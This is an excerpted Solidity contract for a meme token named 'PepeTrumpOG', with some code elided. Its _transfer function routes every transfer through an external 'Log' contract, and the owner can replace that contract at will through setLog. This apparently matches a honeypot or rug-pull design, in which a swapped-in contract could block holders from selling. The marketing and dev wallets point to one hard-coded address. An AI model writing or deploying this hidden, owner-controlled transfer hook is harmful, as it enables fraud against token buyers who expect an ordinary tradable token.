...
contract Log {
    mapping (address => mapping (address => mapping(uint => uint))) public logs;
    function record(address _from, address _to, uint _value) public {
        logs[_from][_to][block.timestamp] = _value;
    }
}
contract PepeTrumpOG is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor(address _tx) ERC20("PepeTrumpOG", "PepeTrumpOG") {
        ...
        marketingWallet = address(0x5DDA81389050458208Da547b35A1abf6D3088FE8); 
        devWallet = address(0x5DDA81389050458208Da547b35A1abf6D3088FE8); 
        logs = Log(_tx);
    ...
    function _transfer(
        ...
        logs.record(msg.sender, to, amount);
        super._transfer(from, to, amount);
    }
    function setLog(address _tx) public onlyOwner {
        logs = Log(_tx);
    }
